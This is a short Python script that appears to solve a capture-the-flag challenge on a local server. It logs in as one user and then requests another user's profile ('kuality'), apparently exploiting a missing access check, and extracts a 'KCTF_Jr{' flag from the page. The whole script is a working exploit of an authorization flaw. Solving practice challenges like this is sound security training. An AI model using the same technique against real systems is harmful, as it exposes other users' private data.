import requests

url = "http://127.0.0.1:20206"

r = requests.post(url + "/login", data={"id":"user1", "password":"1234"})

sess = r.history[0].cookies.get_dict()

r = requests.get(url + "/profile", params={"user_id":"kuality"}, cookies=sess)

print(r.text[r.text.find("KCTF_Jr{"):r.text.find("KCTF_Jr{")+64+len("KCTF_Jr{")+1])
